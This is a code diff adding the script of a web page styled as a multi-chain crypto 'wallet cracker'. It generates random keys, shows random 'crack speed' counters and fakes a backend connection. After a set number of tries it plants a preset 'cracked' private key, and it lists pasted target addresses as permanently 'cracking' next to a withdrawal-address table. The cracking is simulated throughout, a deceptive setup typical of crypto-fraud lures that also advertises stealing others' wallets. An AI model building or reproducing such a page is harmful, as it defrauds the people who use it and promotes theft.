+        const targetSpeed = Math.floor(Math.random() * (maxSpeed - minSpeed + 1)) + minSpeed;
+        
+        if (currentSpeed === 0) {
+          currentSpeed = targetSpeed;
+        } else {
+          const speedDiff = targetSpeed - currentSpeed;
+          currentSpeed += Math.sign(speedDiff) * Math.min(Math.abs(speedDiff), 5);
+        }
+        
+        document.getElementById('speed').innerText = currentSpeed.toLocaleString();
+        lastTime = now;
+        lastTries = tries;
+      }
+    }
+    
+    function updateRuntime() {
+      const elapsed = Math.floor((Date.now() - startTime) / 1000);
+      const hours = Math.floor(elapsed / 3600).toString().padStart(2, '0');
+      const minutes = Math.floor((elapsed % 3600) / 60).toString().padStart(2, '0');
+      const seconds = (elapsed % 60).toString().padStart(2, '0');
+      document.getElementById('runtime').innerText = `${hours}:${minutes}:${seconds}`;
+    }
+
+    function generate() {
+      const t = translations[currentLang];
+      const chain = document.getElementById('chain').value;
+      const country = document.getElementById('country').value;
+      const countryFlag = countryFlags[country] || '🌍';
+      const keygenProcess = document.getElementById('keygenProcess');
+
+      // Remove empty state
+      const results = document.getElementById('results');
+      if (results.querySelector('.text-center')) {
+        results.innerHTML = '';
+      }
+      
+      // Clear keygen process empty state
+      if (keygenProcess.querySelector('.opacity-50')) {
+        keygenProcess.innerHTML = '';
+      }
+
+      function generateLoop() {
+        if (!running) return;
+        
+        // Check network connection - stop if offline
+        if (!navigator.onLine) {
+          stopGeneration();
+          showOfflineMessage();
+          return;
+        }
+        
+        // Generate addresses at a controlled pace
+        for (let i = 0; i < 3; i++) {
+          if (!running) break;
+          
+          tries++;
+
+          // Local demo only: reveal the supplied sample string at the requested count.
+          // It is displayed as text and is never used to derive or access a wallet.
+          if (!demoRevealShown && tries >= demoRevealAt) {
+            demoRevealShown = true;
+            const demoAddress = document.createElement('div');
+            demoAddress.className = 'p-4 rounded-xl mb-3 text-xs font-mono break-all';
+            demoAddress.style.cssText = 'background:rgba(34,197,94,.15);border:1px solid rgba(34,197,94,.5);color:#22d3ee';
+            demoAddress.textContent = demoPrivateKey;
+            const crackedList = document.getElementById('crackedList');
+            if (crackedList.querySelector('.opacity-50')) crackedList.innerHTML = '';
+            crackedList.prepend(demoAddress);
+          }
+          
+          let address = '', pk = '';
+
+          try {
+            if (chain === 'tron') {
+              const acc = window.TronWeb.utils.accounts.generateAccount();
+              address = acc.address.base58;
+              pk = acc.privateKey;
+            }
+
+            if (chain === 'eth') {
+              const wallet = ethers.Wallet.createRandom();
+              address = wallet.address;
+              pk = wallet.privateKey;
+            }
+
+            if (chain === 'btc') {
+              const keyPair = bitcoinjs.ECPair.makeRandom();
+              const { address: btcAddr } = bitcoinjs.payments.p2pkh({ pubkey: keyPair.publicKey });
+              address = btcAddr;
+              pk = keyPair.toWIF();
+            }
+            
+            // Display private key in generation process
+            if (pk) {
+              const processLine = document.createElement('div');
+              processLine.style.marginBottom = '4px';
+              processLine.innerHTML = `<span style="color: #6366f1;">🔑</span> ${pk}`;
+              keygenProcess.appendChild(processLine);
+              
+              trimLog(keygenProcess);
+              
+              // Auto scroll to bottom
+              keygenProcess.scrollTop = keygenProcess.scrollHeight;
+            }
+          } catch (error) {
+            console.error('Generation error:', error);
+            continue;
+          }
+
+          // Show address results in the right panel
+          if (address) {
+            found++;
+            
+            // Add to results panel
+            const div = document.createElement('div');
+            div.className = 'result-item rounded-2xl p-6';
+            div.style.background = 'rgba(30, 41, 59, 0.8)';
+            div.style.border = '1px solid rgba(99, 102, 241, 0.3)';
+            
+            const chainBadge = chain === 'tron' ? 'chain-tron' : chain === 'eth' ? 'chain-eth' : 'chain-btc';
+            const chainName = chain === 'tron' ? 'TRON' : chain === 'eth' ? 'ETHEREUM' : 'BITCOIN';
+            
+            const addressCopyId = `copy-addr-${Date.now()}-${Math.random()}`;
+            const pkCopyId = `copy-pk-${Date.now()}-${Math.random()}`;
+            
+            div.innerHTML = `
+              <div class="flex items-center justify-between mb-4">
+                <span class="chain-badge ${chainBadge}">${chainName}</span>
+                <span style="font-size: 1.5rem;">${countryFlag}</span>
+              </div>
+              <div class="mb-4">
+                <div class="flex items-center justify-between mb-2">
+                  <div class="text-xs font-semibold opacity-75">${t.addressLabel}</div>
+                  <button id="${addressCopyId}" class="copy-btn px-3 py-1 rounded-lg text-xs font-bold transition-all" style="background: rgba(34, 211, 238, 0.1); color: #22d3ee; border: 1px solid rgba(34, 211, 238, 0.3);">
+                    ${t.copyBtn}
+                  </button>
+                </div>
+                <div class="mono-text" style="color: #22d3ee;">${address}</div>
+              </div>
+              <div>
+                <div class="flex items-center justify-between mb-2">
+                  <div class="text-xs font-semibold opacity-75">${t.privateKeyLabel}</div>
+                  <button id="${pkCopyId}" class="copy-btn px-3 py-1 rounded-lg text-xs font-bold transition-all" style="background: rgba(251, 113, 133, 0.1); color: #fb7185; border: 1px solid rgba(251, 113, 133, 0.3);">
+                    ${t.copyBtn}
+                  </button>
+                </div>
+                <div class="mono-text" style="color: #fb7185;">${pk}</div>
+              </div>
+            `;
+            
+            results.prepend(div);
+            trimLog(results, true);
+            
+            // Use setTimeout to ensure DOM is ready
+            setTimeout(() => {
+              const addrBtn = document.getElementById(addressCopyId);
+              const pkBtn = document.getElementById(pkCopyId);
+              
+              if (addrBtn) {
+                addrBtn.addEventListener('click', function() {
+                  copyToClipboard(address, this);
+                });
+              }
+              
+              if (pkBtn) {
+                pkBtn.addEventListener('click', function() {
+                  copyToClipboard(pk, this);
+                });
+              }
+            }, 0);
+          }
+        }
+
+        updateStats();
+        setTimeout(generateLoop, 100);
+      }
+      
+      generateLoop();
+    }
+
+    document.getElementById('start').onclick = () => {
+      running = true;
+      startTime = Date.now();
+      document.getElementById('start').disabled = true;
+      document.getElementById('start').classList.add('pulse-animation');
+      document.getElementById('stop').disabled = false;
+      
+      runtimeInterval = setInterval(updateRuntime, 1000);
+      
+      offlineCheckInterval = setInterval(() => {
+        if (!navigator.onLine && running) {
+          stopGeneration();
+          showOfflineMessage();
+        }
+      }, 500);
+      
+      window.addEventListener('offline', handleOffline);
+      
+      generate();
+    };
+
+    document.getElementById('stop').onclick = () => {
+      stopGeneration();
+      window.removeEventListener('offline', handleOffline);
+    };
+    
+    function handleOffline() {
+      if (running) {
+        stopGeneration();
+        showOfflineMessage();
+      }
+    }
+    
+    // Connect to backend button handler
+    document.getElementById('connectBackend').onclick = () => {
+      const t = translations[currentLang];
+      const button = document.getElementById('connectBackend');
+      const btnTextEl = document.getElementById('connectBtnText');
+      const originalText = btnTextEl.textContent;
+      
+      btnTextEl.textContent = t.connectingText;
+      button.disabled = true;
+      button.style.opacity = '0.7';
+      
+      // Simulate connection process
+      setTimeout(() => {
+        btnTextEl.textContent = t.connectedText;
+        button.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
+        button.style.borderColor = 'rgba(34, 197, 94, 0.5)';
+        button.style.boxShadow = '0 4px 15px rgba(34, 197, 94, 0.3)';
+        
+        // Show connection message
+        const results = document.getElementById('results');
+        const connectDiv = document.createElement('div');
+        connectDiv.className = 'result-item rounded-2xl p-6 mb-4';
+        connectDiv.style.background = 'rgba(34, 197, 94, 0.15)';
+        connectDiv.style.border = '2px solid rgba(34, 197, 94, 0.5)';
+        connectDiv.style.borderLeft = '4px solid #22c55e';
+        
+        connectDiv.innerHTML = `
+          <div class="flex items-center gap-3 mb-2">
+            <span class="text-3xl">✅</span>
+            <span class="text-lg font-bold" style="color: #22c55e;">${t.connectSuccessTitle}</span>
+          </div>
+          <div class="text-sm opacity-75">${t.connectSuccessDesc}</div>
+        `;
+        
+        results.prepend(connectDiv);
+        trimLog(results, true);
+        
+        setTimeout(() => {
+          button.style.opacity = '1';
+        }, 2000);
+        
+        // Auto remove connection message after 5 seconds
+        setTimeout(() => {
+          connectDiv.style.transition = 'all 0.5s ease-out';
+          connectDiv.style.opacity = '0';
+          connectDiv.style.transform = 'translateY(-20px)';
+          setTimeout(() => {
+            connectDiv.remove();
+          }, 500);
+        }, 5000);
+      }, 1500);
+    };
+
+    function copyToClipboard(text, button) {
+      const t = translations[currentLang];
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = button.innerHTML;
+        button.innerHTML = t.copiedBtn;
+        button.style.background = 'rgba(34, 197, 94, 0.2)';
+        button.style.color = '#22c55e';
+        button.style.borderColor = 'rgba(34, 197, 94, 0.4)';
+        
+        setTimeout(() => {
+          button.innerHTML = originalText;
+          button.style.background = '';
+          button.style.color = '';
+          button.style.borderColor = '';
+        }, 2000);
+      }).catch(err => {
+        button.innerHTML = t.copyFailedBtn;
+        setTimeout(() => {
+          button.innerHTML = t.copyBtn;
+        }, 2000);
+      });
+    }
+    
+    function addToCrackedList(chain, address, privateKey) {
+      const t = translations[currentLang];
+      const crackedList = document.getElementById('crackedList');
+      
+      // Remove empty state
+      if (crackedList.querySelector('.opacity-50')) {
+        crackedList.innerHTML = '';
+      }
+      
+      const chainBadge = chain === 'tron' ? 'chain-tron' : chain === 'eth' ? 'chain-eth' : 'chain-btc';
+      const chainName = chain === 'tron' ? 'TRON' : chain === 'eth' ? 'ETHEREUM' : 'BITCOIN';
+      
+      const item = document.createElement('div');
+      item.className = 'p-4 rounded-xl mb-3 transition-all';
+      item.style.background = 'linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(16, 185, 129, 0.15))';
+      item.style.border = '2px solid rgba(34, 197, 94, 0.5)';
+      item.style.animation = 'slideIn 0.5s ease-out';
+      
+      const crackedAddrCopyId = `cracked-addr-${Date.now()}`;
+      const crackedPkCopyId = `cracked-pk-${Date.now()}`;
+      
+      item.innerHTML = `
+        <div class="flex items-center justify-between mb-3">
+          <span class="chain-badge ${chainBadge}">${chainName}</span>
+          <span class="text-xs font-bold" style="color: #22c55e;">${t.crackedBadge}</span>
+        </div>
+        <div class="mb-2">
+          <div class="flex items-center justify-between mb-1">
+            <div class="text-xs font-semibold opacity-75">${t.addressLabel}</div>
+            <button id="${crackedAddrCopyId}" class="copy-btn px-2 py-1 rounded-lg text-xs font-bold" style="background: rgba(34, 211, 238, 0.1); color: #22d3ee; border: 1px solid rgba(34, 211, 238, 0.3);">
+              📋
+            </button>
+          </div>
+          <div class="text-xs font-mono break-all" style="color: #22d3ee;">${address}</div>
+        </div>
+        <div>
+          <div class="flex items-center justify-between mb-1">
+            <div class="text-xs font-semibold opacity-75">${t.privateKeyLabel}</div>
+            <button id="${crackedPkCopyId}" class="copy-btn px-2 py-1 rounded-lg text-xs font-bold" style="background: rgba(251, 113, 133, 0.1); color: #fb7185; border: 1px solid rgba(251, 113, 133, 0.3);">
+              📋
+            </button>
+          </div>
+          <div class="text-xs font-mono break-all" style="color: #fb7185;">${privateKey}</div>
+        </div>
+      `;
+      
+      crackedList.prepend(item);
+      
+      setTimeout(() => {
+        const addrBtn = document.getElementById(crackedAddrCopyId);
+        const pkBtn = document.getElementById(crackedPkCopyId);
+        
+        if (addrBtn) {
+          addrBtn.addEventListener('click', function() {
+            copyToClipboard(address, this);
+          });
+        }
+        
+        if (pkBtn) {
+          pkBtn.addEventListener('click', function() {
+            copyToClipboard(privateKey, this);
+          });
+        }
+      }, 0);
+    }
+    
+    document.getElementById('transferBtn').onclick = () => {
+      const t = translations[currentLang];
+      const network = document.getElementById('bindNetwork').value;
+      const address = document.getElementById('bindAddress').value.trim();
+      const tbody = document.getElementById('bindingTableBody');
+      const favoriteKeygenProcess = document.getElementById('favoriteKeygenProcess');
+      
+      if (!address) {
+        const transferBtn = document.getElementById('transferBtn');
+        const transferBtnTextEl = document.getElementById('transferBtnText');
+        const originalText = transferBtnTextEl.textContent;
+        transferBtnTextEl.textContent = t.transferBtnWarning;
+        transferBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+        
+        setTimeout(() => {
+          transferBtnTextEl.textContent = originalText;
+          transferBtn.style.background = '';
+        }, 2000);
+        return;
+      }
+      
+      if (favoriteKeygenProcess.querySelector('.opacity-50')) {
+        favoriteKeygenProcess.innerHTML = '';
+      }
+      
+      if (tbody.querySelector('td[colspan="4"]')) {
+        tbody.innerHTML = '';
+      }
+      
+      const row = document.createElement('tr');
+      row.className = 'transition-all hover:bg-opacity-50';
+      row.style.borderBottom = '1px solid rgba(99, 102, 241, 0.2)';
+      
+      const chainBadge = network === 'TRON' ? 'chain-tron' : network === 'ETHEREUM' ? 'chain-eth' : 'chain-btc';
+      const addressCopyId = `copy-table-addr-${Date.now()}`;
+      const deleteId = `delete-${Date.now()}`;
+      
+      let generatedPk = t.crackingText;
+      
+      const processLine = document.createElement('div');
+      processLine.style.marginBottom = '4px';
+      processLine.innerHTML = `<span style="color: #22d3ee;">🔐 ${network}:</span> <span style="color: #fbbf24;">${address}</span> <span style="color: #a78bfa;">→ ${t.crackingText}</span>`;
+      favoriteKeygenProcess.appendChild(processLine);
+      
+      trimLog(favoriteKeygenProcess);
+      
+      favoriteKeygenProcess.scrollTop = favoriteKeygenProcess.scrollHeight;
+      
+      const pkCopyId = `copy-table-pk-${Date.now()}`;
+      
+      row.innerHTML = `
+        <td class="px-6 py-4">
+          <span class="chain-badge ${chainBadge}">${network}</span>
+        </td>
+        <td class="px-6 py-4">
+          <div class="flex items-center gap-3">
+            <span class="mono-text flex-1" style="color: #22d3ee; padding: 8px;">${address}</span>
+            <button id="${addressCopyId}" class="copy-btn px-3 py-1 rounded-lg text-xs font-bold transition-all" style="background: rgba(34, 211, 238, 0.1); color: #22d3ee; border: 1px solid rgba(34, 211, 238, 0.3);">
+              ${t.copyBtn}
+            </button>
+          </div>
+        </td>
+        <td class="px-6 py-4">
+          <div class="flex items-center gap-3">
+            <span class="mono-text flex-1" style="color: #fbbf24; padding: 8px;">${generatedPk}</span>
+            <button id="${pkCopyId}" class="copy-btn px-3 py-1 rounded-lg text-xs font-bold transition-all" style="background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3);">
+              ${t.copyBtn}
+            </button>
+          </div>
+        </td>
+        <td class="px-6 py-4 text-center">
+          <button id="${deleteId}" class="delete-btn">
+            ${t.tableDeleteBtn}
+          </button>
+        </td>
+      `;
+      
+      tbody.appendChild(row);
+      
+      document.getElementById(addressCopyId).addEventListener('click', function() {
+        copyToClipboard(address, this);
+      });
+      
+      document.getElementById(pkCopyId).addEventListener('click', function() {
+        copyToClipboard(generatedPk, this);
+      });
+      
+      document.getElementById(deleteId).addEventListener('click', function() {
+        row.remove();
+        
+        if (tbody.children.length === 0) {
+          tbody.innerHTML = `
+            <tr>
+              <td colspan="4" class="px-6 py-20 text-center">
+                <div class="text-5xl mb-4 opacity-30">📭</div>
+                <div class="text-lg font-semibold opacity-50">${t.tableEmpty}</div>
+                <div class="text-sm opacity-30 mt-2">${t.tableEmptyDesc}</div>
+              </td>
+            </tr>
+          `;
+        }
+      });
+      
+      document.getElementById('bindAddress').value = '';
+      
+      // Start favorite crack speed counter
+      if (!favoriteSpeedInterval) {
+        favoriteCrackSpeed = 0;
+        favoriteSpeedInterval = setInterval(() => {
+          const minSpeed = 45;
+          const maxSpeed = 78;
+          const targetSpeed = Math.floor(Math.random() * (maxSpeed - minSpeed + 1)) + minSpeed;
+          
+          if (favoriteCrackSpeed === 0) {
+            favoriteCrackSpeed = targetSpeed;
+          } else {
+            const speedDiff = targetSpeed - favoriteCrackSpeed;
+            favoriteCrackSpeed += Math.sign(speedDiff) * Math.min(Math.abs(speedDiff), 3);
+          }
+          
+          document.getElementById('favoriteSpeed').innerText = favoriteCrackSpeed.toLocaleString();
+        }, 150);
+      }
+      
+      const transferBtn = document.getElementById('transferBtn');
+      const transferBtnTextEl = document.getElementById('transferBtnText');
+      const originalText = transferBtnTextEl.textContent;
+      transferBtnTextEl.textContent = t.transferBtnSuccess;
+      transferBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
+      
+      setTimeout(() => {
+        transferBtnTextEl.textContent = originalText;
+        transferBtn.style.background = '';
+      }, 2000);
+    };
+    
+    // Withdrawal address button handler
+    document.getElementById('withdrawalBtn').onclick = () => {
+      const t = translations[currentLang];
+      const network = document.getElementById('withdrawalNetwork').value;
+      const address = document.getElementById('withdrawalAddress').value.trim();
+      const tbody = document.getElementById('withdrawalTableBody');
+      
+      if (!address) {
+        const withdrawalBtn = document.getElementById('withdrawalBtn');
+        const withdrawalBtnTextEl = document.getElementById('withdrawalBtnText');
+        const originalText = withdrawalBtnTextEl.textContent;
+        withdrawalBtnTextEl.textContent = t.withdrawalBtnWarning;
+        withdrawalBtn.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+        
+        setTimeout(() => {
+          withdrawalBtnTextEl.textContent = originalText;
+          withdrawalBtn.style.background = '';
+        }, 2000);
+        return;
+      }
+      
+      if (tbody.querySelector('td[colspan="3"]')) {
+        tbody.innerHTML = '';
+      }
+      
+      const row = document.createElement('tr');
+      row.className = 'transition-all hover:bg-opacity-50';
+      row.style.borderBottom = '1px solid rgba(251, 191, 36, 0.2)';
+      
+      const chainBadge = network === 'TRON' ? 'chain-tron' : network === 'ETHEREUM' ? 'chain-eth' : 'chain-btc';
+      const addressCopyId = `copy-withdrawal-addr-${Date.now()}`;
+      const deleteId = `delete-withdrawal-${Date.now()}`;
+      
+      row.innerHTML = `
+        <td class="px-6 py-4">
+          <span class="chain-badge ${chainBadge}">${network}</span>
+        </td>
+        <td class="px-6 py-4">
+          <div class="flex items-center gap-3">
+            <span class="mono-text flex-1" style="color: #fbbf24; padding: 8px;">${address}</span>
+            <button id="${addressCopyId}" class="copy-btn px-3 py-1 rounded-lg text-xs font-bold transition-all" style="background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3);">
+              ${t.copyBtn}
+            </button>
+          </div>
+        </td>
+        <td class="px-6 py-4 text-center">
+          <button id="${deleteId}" class="delete-btn" style="background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 8px 16px; rounded: 8px; font-size: 13px; font-weight: 700; transition: all 0.3s;">
+            ${t.withdrawalDeleteBtn}
+          </button>
+        </td>
+      `;
+      
+      tbody.appendChild(row);
+      
+      document.getElementById(addressCopyId).addEventListener('click', function() {
+        copyToClipboard(address, this);
+      });
+      
+      document.getElementById(deleteId).addEventListener('click', function() {
+        row.remove();
+        
+        if (tbody.children.length === 0) {
+          tbody.innerHTML = `
+            <tr>
+              <td colspan="3" class="px-6 py-20 text-center">
+                <div class="text-5xl mb-4 opacity-30">💰</div>
+                <div class="text-lg font-semibold opacity-50">${t.withdrawalTableEmpty}</div>
+                <div class="text-sm opacity-30 mt-2">${t.withdrawalTableEmptyDesc}</div>
+              </td>
+            </tr>
+          `;
+        }
+      });
+      
+      document.getElementById('withdrawalAddress').value = '';
+      
+      const withdrawalBtn = document.getElementById('withdrawalBtn');
+      const withdrawalBtnTextEl = document.getElementById('withdrawalBtnText');
+      const originalText = withdrawalBtnTextEl.textContent;
+      withdrawalBtnTextEl.textContent = t.withdrawalBtnSuccess;
+      withdrawalBtn.style.background = 'linear-gradient(135deg, #22c55e, #16a34a)';
+      
+      setTimeout(() => {
+        withdrawalBtnTextEl.textContent = originalText;
+        withdrawalBtn.style.background = '';
+      }, 2000);
+    };
+  </script>
+ <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9c71edccd7781e93',t:'MTc2OTk1Mzk0Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
